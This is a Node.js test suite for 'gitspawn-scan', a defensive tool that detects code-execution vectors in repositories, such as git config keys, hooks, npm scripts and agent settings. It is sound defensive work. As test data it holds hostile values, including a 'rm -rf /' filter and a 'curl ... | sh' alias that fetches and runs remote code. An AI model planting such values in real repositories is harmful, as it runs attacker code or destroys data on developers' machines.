'use strict';

// Zero-dependency test runner. `npm test`.

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawnSync } = require('child_process');

const { scan } = require('../src/scan');
const { render } = require('../src/report');
const { parseGitConfig, isBooleanish } = require('../src/gitconfig');
const { SEVERITY_RANK } = require('../src/util');

const BIN = path.join(__dirname, '..', 'bin', 'gitspawn-scan.js');

// Fixtures are materialised into a temp tree so the tests see a real `.git`.
// See test/fixtures/README.md for why they ship as `dot-git/`.
const { workDir, materialize } = require('./materialize');

const WORK = workDir();
const EVIL = materialize('evil-repo', WORK);
const CLEAN = materialize('clean-repo', WORK);

let passed = 0;
let failed = 0;

function test(name, fn) {
  try {
    fn();
    passed++;
    process.stdout.write(`  ok    ${name}\n`);
  } catch (err) {
    failed++;
    process.stdout.write(`  FAIL  ${name}\n        ${String(err.message).split('\n')[0]}\n`);
  }
}

function ids(result) {
  return result.findings.map((f) => f.ruleId);
}

function atLeast(result, severity) {
  return result.findings.filter((f) => SEVERITY_RANK[f.severity] >= SEVERITY_RANK[severity]);
}

// ---------------------------------------------------------------------------
process.stdout.write('\ngit config parser\n');

test('parses a bare section and key/value pairs with line numbers', () => {
  const entries = parseGitConfig('[core]\n\trepositoryformatversion = 0\n\tbare = false\n');
  assert.strictEqual(entries.length, 2);
  assert.deepStrictEqual(
    { section: entries[0].section, key: entries[0].key, value: entries[0].value, line: entries[0].line },
    { section: 'core', key: 'repositoryformatversion', value: '0', line: 2 }
  );
});

test('parses subsections and builds dotted names', () => {
  const [e] = parseGitConfig('[filter "hostile"]\n\tclean = rm -rf /\n');
  assert.strictEqual(e.section, 'filter');
  assert.strictEqual(e.subsection, 'hostile');
  assert.strictEqual(e.key, 'clean');
  assert.strictEqual(e.name, 'filter.hostile.clean');
  assert.strictEqual(e.value, 'rm -rf /');
});

test('keeps subsection case but lowercases section and key', () => {
  const [e] = parseGitConfig('[Merge "MyDriver"]\n\tDriver = x\n');
  assert.strictEqual(e.section, 'merge');
  assert.strictEqual(e.subsection, 'MyDriver');
  assert.strictEqual(e.key, 'driver');
});

test('handles subsections containing colons and slashes', () => {
  const [e] = parseGitConfig('[credential "https://example.com/x"]\n\thelper = store\n');
  assert.strictEqual(e.subsection, 'https://example.com/x');
});

test('unquotes values and processes escapes', () => {
  const [e] = parseGitConfig('[alias]\n\tx = "a \\"b\\" \\t c"\n');
  assert.strictEqual(e.value, 'a "b" \t c');
});

test('preserves shell metacharacters rather than stripping them', () => {
  const [e] = parseGitConfig('[alias]\n\tpwn = !curl -s http://x/y | sh\n');
  assert.strictEqual(e.value, '!curl -s http://x/y | sh');
});

test('skips comments and blank lines', () => {
  const entries = parseGitConfig('# c\n; c2\n\n[core]\n\n\tbare = true\n');
  assert.strictEqual(entries.length, 1);
  assert.strictEqual(entries[0].line, 6);
});

test('handles the legacy [section.subsection] form', () => {
  const [e] = parseGitConfig('[filter.hostile]\n\tclean = x\n');
  assert.strictEqual(e.section, 'filter');
  assert.strictEqual(e.subsection, 'hostile');
});

test('keys with no = are ignored rather than crashing', () => {
  assert.deepStrictEqual(parseGitConfig('[core]\n\tnothinghere\n'), []);
});

test('accepts non-string input defensively', () => {
  assert.deepStrictEqual(parseGitConfig(null), []);
  assert.deepStrictEqual(parseGitConfig(undefined), []);
});

test('isBooleanish distinguishes booleans from commands', () => {
  assert.ok(isBooleanish('true'));
  assert.ok(isBooleanish('false'));
  assert.ok(isBooleanish(''));
  assert.ok(isBooleanish('1'));
  assert.ok(!isBooleanish('/tmp/payload.sh'));
  assert.ok(!isBooleanish('curl http://x | sh'));
});

// ---------------------------------------------------------------------------
process.stdout.write('\ngitconfig rules against the hostile fixture\n');

const evil = scan(EVIL);
const evilIds = ids(evil);

const EXPECTED = [
  ['GS001', 'core.fsmonitor command execution'],
  ['GS002', 'core.hooksPath redirection'],
  ['GS003', 'core.sshCommand execution'],
  ['GS004', 'unvetted credential helper'],
  ['GS005', 'diff driver command'],
  ['GS006', 'merge driver command'],
  ['GS007', 'clean/smudge filter command'],
  ['GS009', 'shell-escape alias'],
  ['GS010', 'include.path'],
  ['GS011', 'submodule update shell escape'],
  ['GS012', 'core.pager'],
  ['GS015', 'url.insteadOf rewrite'],
  ['GS016', 'http proxy override'],
  ['GS017', 'core.attributesFile'],
  ['GS021', 'hook in .git/hooks'],
  ['GS022', 'unknown content filter attribute'],
  ['GS023', 'custom diff attribute'],
  ['GS031', 'agent hooks in project settings'],
  ['GS032', 'pre-authorised wildcard permissions'],
  ['GS034', 'project-shipped MCP server'],
  ['GS035', 'agent instruction file'],
  ['GS040', 'VS Code folderOpen task'],
  ['GS042', '.envrc'],
  ['GS043', 'npm onload-script'],
  ['GS044', 'redirected npm registry'],
  ['GS045', 're-enabled install scripts'],
  ['GS049', 'package.json lifecycle script'],
];

for (const [id, label] of EXPECTED) {
  test(`reports ${id} — ${label}`, () => {
    assert.ok(evilIds.includes(id), `expected ${id} in [${[...new Set(evilIds)].sort().join(', ')}]`);
  });
}

test('reports several distinct rule families in one pass', () => {
  assert.ok(new Set(evilIds).size >= 25, `only ${new Set(evilIds).size} distinct rules fired`);
});

test('every finding carries a file, rationale and remediation', () => {
  for (const f of evil.findings) {
    assert.ok(f.file, `${f.ruleId} has no file`);
    assert.ok(f.rationale && f.rationale.length > 30, `${f.ruleId} rationale too thin`);
    assert.ok(f.remediation, `${f.ruleId} has no remediation`);
    assert.ok(SEVERITY_RANK[f.severity] !== undefined, `${f.ruleId} bad severity`);
  }
});

test('findings are sorted most severe first', () => {
  const ranks = evil.findings.map((f) => SEVERITY_RANK[f.severity]);
  for (let i = 1; i < ranks.length; i++) {
    assert.ok(ranks[i - 1] >= ranks[i], 'severity order broken');
  }
});

test('carries accurate line numbers back to the config file', () => {
  const fsmonitor = evil.findings.find((f) => f.ruleId === 'GS001');
  const lines = fs.readFileSync(path.join(EVIL, '.git', 'config'), 'utf8').split(/\r?\n/);
  assert.ok(/fsmonitor/.test(lines[fsmonitor.line - 1]), 'GS001 points at the wrong line');
});

test('flags only the real hook, not the .sample next to it', () => {
  const hooks = evil.findings.filter((f) => f.ruleId === 'GS021');
  assert.strictEqual(hooks.length, 1);
  assert.strictEqual(hooks[0].evidence, 'pre-commit');
});

test('flags the local MCP server as high and the remote one as medium', () => {
  const local = evil.findings.find((f) => f.ruleId === 'GS034' && /helper/.test(f.title));
  const remote = evil.findings.find((f) => f.ruleId === 'GS034' && /remote/.test(f.title));
  assert.strictEqual(local.severity, 'high');
  assert.strictEqual(remote.severity, 'medium');
});

// ---------------------------------------------------------------------------
process.stdout.write('\nnegative control\n');

const clean = scan(CLEAN);

test('a plausible project produces no findings at all', () => {
  assert.deepStrictEqual(ids(clean), [], `unexpected: ${JSON.stringify(clean.findings, null, 2)}`);
});

test('stock .sample hooks are not reported', () => {
  assert.ok(!ids(clean).includes('GS021'));
});

test('a known credential helper and lfs filter are not reported', () => {
  assert.ok(!ids(clean).includes('GS004'), 'credential.helper = manager should be allowed');
  assert.ok(!ids(clean).includes('GS022'), 'filter=lfs should be allowed');
  assert.ok(!ids(clean).includes('GS023'), 'diff=lfs should be allowed');
});

test('a VS Code task without runOn is not reported', () => {
  assert.ok(!ids(clean).includes('GS040'));
});

test('a package.json without lifecycle scripts is not reported', () => {
  assert.ok(!ids(clean).includes('GS049'));
});

// ---------------------------------------------------------------------------
process.stdout.write('\nlayout edge cases\n');

function tempRepo(build) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'gitspawn-test-'));
  build(dir);
  return dir;
}

test('finds a nested repository, not just the top level', () => {
  const dir = tempRepo((d) => {
    fs.mkdirSync(path.join(d, 'vendor', 'lib', '.git'), { recursive: true });
    fs.writeFileSync(path.join(d, 'vendor', 'lib', '.git', 'config'), '[core]\n\tfsmonitor = /tmp/x.sh\n');
  });
  const res = scan(dir);
  assert.ok(ids(res).includes('GS001'), 'nested config was not read');
  fs.rmSync(dir, { recursive: true, force: true });
});

test('flags a .git pointer file that escapes the scanned folder', () => {
  const outside = tempRepo((d) => {
    fs.mkdirSync(path.join(d, 'real'), { recursive: true });
    fs.writeFileSync(path.join(d, 'real', 'config'), '[core]\n\tfsmonitor = /tmp/x.sh\n');
  });
  const dir = tempRepo((d) => {
    fs.writeFileSync(path.join(d, '.git'), `gitdir: ${path.join(outside, 'real')}\n`);
  });
  const res = scan(dir);
  const pointer = res.findings.find((f) => f.ruleId === 'GS020');
  assert.ok(pointer, 'pointer file not reported');
  assert.strictEqual(pointer.severity, 'high');
  assert.ok(ids(res).includes('GS001'), 'config behind the pointer was not read');
  fs.rmSync(dir, { recursive: true, force: true });
  fs.rmSync(outside, { recursive: true, force: true });
});

test('does not descend into node_modules looking for repositories', () => {
  const dir = tempRepo((d) => {
    fs.mkdirSync(path.join(d, 'node_modules', 'dep', '.git'), { recursive: true });
    fs.writeFileSync(path.join(d, 'node_modules', 'dep', '.git', 'config'), '[core]\n\tfsmonitor = /tmp/x.sh\n');
  });
  const res = scan(dir);
  assert.deepStrictEqual(ids(res), []);
  fs.rmSync(dir, { recursive: true, force: true });
});

test('reports an unparseable agent settings file instead of crashing', () => {
  const dir = tempRepo((d) => {
    fs.mkdirSync(path.join(d, '.claude'), { recursive: true });
    fs.writeFileSync(path.join(d, '.claude', 'settings.json'), '{ hooks: ');
  });
  const res = scan(dir);
  assert.ok(ids(res).includes('GS030'));
  fs.rmSync(dir, { recursive: true, force: true });
});

test('an empty directory scans clean', () => {
  const dir = tempRepo(() => {});
  assert.deepStrictEqual(scan(dir).findings, []);
  fs.rmSync(dir, { recursive: true, force: true });
});

// Regression: notable files were once keyed by their path relative to the
// scanned root, so every file-based rule silently no-oped unless the scanned
// folder happened to be the repository root itself.
test('finds notable files inside a nested repository, not only at the top level', () => {
  const dir = tempRepo((d) => {
    const repo = path.join(d, 'vendor', 'dep');
    fs.mkdirSync(path.join(repo, '.git'), { recursive: true });
    fs.mkdirSync(path.join(repo, '.claude'), { recursive: true });
    fs.writeFileSync(path.join(repo, '.git', 'config'), '[core]\n\tbare = false\n');
    fs.writeFileSync(path.join(repo, '.npmrc'), 'onload-script=./x.js\n');
    fs.writeFileSync(path.join(repo, '.claude', 'settings.json'), JSON.stringify({ hooks: { Stop: [] } }));
  });

  const res = scan(dir);
  const got = ids(res);
  assert.ok(got.includes('GS043'), `.npmrc in a nested repo was missed: [${got}]`);
  assert.ok(got.includes('GS031'), `.claude/settings.json in a nested repo was missed: [${got}]`);

  const npm = res.findings.find((f) => f.ruleId === 'GS043');
  assert.strictEqual(npm.file, 'vendor/dep/.npmrc', 'nested finding reports the wrong path');
  fs.rmSync(dir, { recursive: true, force: true });
});

test('scanning a folder above the hostile fixture finds everything the direct scan does', () => {
  const got = new Set(ids(scan(path.dirname(EVIL))));
  const missing = [...new Set(evilIds)].filter((id) => !got.has(id));
  assert.deepStrictEqual(missing, [], `rules lost when scanning from a parent directory: ${missing}`);
});

// ---------------------------------------------------------------------------
// Rule reachability.
//
// The hostile fixture covers most of the rule set, but not all of it. Some
// rules need inputs that would look out of place in a fixture whose job is to
// read as one coherent malicious repository — a setup.py, a husky hook, a
// devcontainer. Two more only fire on a file that cannot be parsed at all,
// which the fixture has no reason to contain.
//
// The last test in this block is the one that earns its keep: add a rule to
// src/rules/ without pinning it here and it fails. Without it a rule can
// quietly stop matching after a refactor while every other test stays green,
// which is a false negative in a tool whose entire output is a list of things
// that will run.

function builtRepo(name, build) {
  const dir = path.join(WORK, `probe-${name}`);
  fs.rmSync(dir, { recursive: true, force: true });
  fs.mkdirSync(path.join(dir, '.git'), { recursive: true });
  fs.writeFileSync(path.join(dir, '.git', 'config'), '[core]\n\trepositoryformatversion = 0\n');
  build(dir);
  return dir;
}

function put(dir, rel, text) {
  fs.mkdirSync(path.join(dir, path.dirname(rel)), { recursive: true });
  fs.writeFileSync(path.join(dir, rel), text);
}

function setConfig(dir, text) {
  fs.writeFileSync(path.join(dir, '.git', 'config'),
    `[core]\n\trepositoryformatversion = 0\n${text}`);
}

const PROBES = [
  ['GS008', 'gpg.program', (d) => setConfig(d, '[gpg]\n\tprogram = /tmp/evil-gpg\n')],
  ['GS013', 'core.editor', (d) => setConfig(d, '[core]\n\teditor = /tmp/evil-editor\n')],
  ['GS014', 'core.gitProxy', (d) => setConfig(d, '[core]\n\tgitProxy = /tmp/evil-proxy\n')],
  ['GS020', 'a .git pointer that does not escape', (d) => {
    fs.rmSync(path.join(d, '.git'), { recursive: true, force: true });
    fs.mkdirSync(path.join(d, 'actual'));
    fs.writeFileSync(path.join(d, '.git'), 'gitdir: ./actual\n');
  }],
  ['GS030', 'an unparseable agent settings file', (d) => put(d, '.claude/settings.json', '{ hooks: ')],
  ['GS033', 'an unparseable MCP file', (d) => put(d, '.mcp.json', '{ mcpServers: ')],
  ['GS041', 'a devcontainer lifecycle command',
    (d) => put(d, '.devcontainer/devcontainer.json', JSON.stringify({ postCreateCommand: 'echo hi' }))],
  ['GS046', 'a committed npm auth token',
    (d) => put(d, '.npmrc', '//registry.npmjs.org/:_authToken=deadbeefcafe\n')],
  ['GS047', 'yarnPath',
    (d) => put(d, '.yarnrc.yml', 'yarnPath: .yarn/releases/yarn-4.0.0.cjs\n')],
  ['GS048', 'a yarn plugin loaded from the repository',
    (d) => put(d, '.yarnrc.yml', 'plugins:\n  - path: ./.yarn/evil.cjs\n')],
  ['GS050', 'setup.py', (d) => put(d, 'setup.py', 'import os\n')],
  ['GS051', 'a husky hook', (d) => put(d, '.husky/pre-commit', '#!/bin/sh\n')],
];

for (const [id, what, build] of PROBES) {
  test(`${id} fires on ${what}`, () => {
    const fired = ids(scan(builtRepo(id, build)));
    assert.ok(fired.includes(id),
      `${id} did not fire; got [${[...new Set(fired)].sort().join(', ')}]`);
  });
}

// Every rule ID the source declares, however each file spells the field:
// gitconfig.js uses `id:`, the other three use `ruleId:`, and two are passed
// positionally to unparseable().
function declaredRuleIds() {
  const dir = path.join(__dirname, '..', 'src', 'rules');
  const found = new Set();
  for (const file of fs.readdirSync(dir)) {
    const text = fs.readFileSync(path.join(dir, file), 'utf8');
    for (const m of text.matchAll(/\b(?:id|ruleId):\s*'(GS\d{3})'/g)) found.add(m[1]);
    for (const m of text.matchAll(/unparseable\([^,]+,\s*'(GS\d{3})'/g)) found.add(m[1]);
  }
  return found;
}

test('every declared rule is pinned by a test', () => {
  const reached = new Set(evilIds);
  for (const [id, , build] of PROBES) {
    for (const fired of ids(scan(builtRepo(`${id}-pin`, build)))) reached.add(fired);
  }
  const missing = [...declaredRuleIds()].filter((id) => !reached.has(id)).sort();
  assert.deepStrictEqual(missing, [], `declared but never exercised: ${missing.join(', ')}`);
});

// ---------------------------------------------------------------------------
process.stdout.write('\nreport and CLI\n');

test('text report renders without colour when asked', () => {
  const out = render(evil, { color: false, quiet: false, short: false });
  assert.ok(!/\x1b\[/.test(out), 'ANSI codes leaked into a --no-color report');
  assert.ok(/GS001/.test(out));
  assert.ok(/STOP/.test(out), 'critical findings should produce a stop verdict');
});

test('--quiet hides info and low findings', () => {
  const out = render(evil, { color: false, quiet: true });
  assert.ok(!/AGENTS\.md/.test(out), 'info findings should be hidden by --quiet');
});

test('--short drops the explanation block', () => {
  const long = render(evil, { color: false });
  const shortOut = render(evil, { color: false, short: true });
  assert.ok(shortOut.length < long.length);
});

test('reports key names in their original casing', () => {
  const out = render(evil, { color: false, short: true });
  assert.ok(/core\.hooksPath/.test(out), 'core.hooksPath was lowercased in the report');
  assert.ok(!/core\.hookspath/.test(out), 'lowercased key name leaked into the report');
  assert.ok(/core\.sshCommand/.test(out));
});

test('long values and fixes wrap instead of being cut mid-word', () => {
  const out = render(evil, { color: false, short: true });
  assert.ok(!/…/.test(out), 'a line was truncated rather than wrapped');
});

function run(args) {
  return spawnSync(process.execPath, [BIN, ...args], { encoding: 'utf8' });
}

test('CLI exits 1 on a hostile folder', () => {
  const r = run([EVIL, '--no-color']);
  assert.strictEqual(r.status, 1, r.stderr);
});

test('CLI exits 0 on a clean folder', () => {
  const r = run([CLEAN, '--no-color']);
  assert.strictEqual(r.status, 0, r.stdout);
});

test('--fail-on=none always exits 0', () => {
  assert.strictEqual(run([EVIL, '--fail-on=none', '--no-color']).status, 0);
});

test('--fail-on=critical still exits 1 when a critical is present', () => {
  assert.strictEqual(run([EVIL, '--fail-on=critical', '--no-color']).status, 1);
});

test('--json emits valid JSON with a summary that matches the findings', () => {
  const r = run([EVIL, '--json']);
  const data = JSON.parse(r.stdout);
  assert.strictEqual(data.tool, 'gitspawn-scan');
  assert.strictEqual(data.summary.total, data.findings.length);
  assert.ok(data.summary.critical > 0);
});

test('--help and --version exit 0', () => {
  assert.strictEqual(run(['--help']).status, 0);
  assert.strictEqual(run(['--version']).status, 0);
});

test('an unknown option exits 2', () => {
  assert.strictEqual(run(['--nope']).status, 2);
});

test('a missing path exits 2', () => {
  assert.strictEqual(run([path.join(os.tmpdir(), 'gitspawn-does-not-exist-xyz')]).status, 2);
});

test('a path that is a file exits 2 rather than reporting clean', () => {
  // Scanning a file as if it were a folder finds nothing and exits 0, which
  // reads as a pass. The scanner must never answer "clean" by accident.
  const file = path.join(WORK, 'not-a-directory.txt');
  fs.writeFileSync(file, 'x');
  const r = run([file]);
  assert.strictEqual(r.status, 2);
  assert.match(r.stderr, /not a directory/);
});

test('the scanner does not modify what it scans', () => {
  const before = fs.readFileSync(path.join(EVIL, '.git', 'config'), 'utf8');
  scan(EVIL);
  const after = fs.readFileSync(path.join(EVIL, '.git', 'config'), 'utf8');
  assert.strictEqual(before, after);
});

// ---------------------------------------------------------------------------
process.stdout.write(`\n${passed} passed, ${failed} failed\n\n`);
process.exitCode = failed === 0 ? 0 : 1;
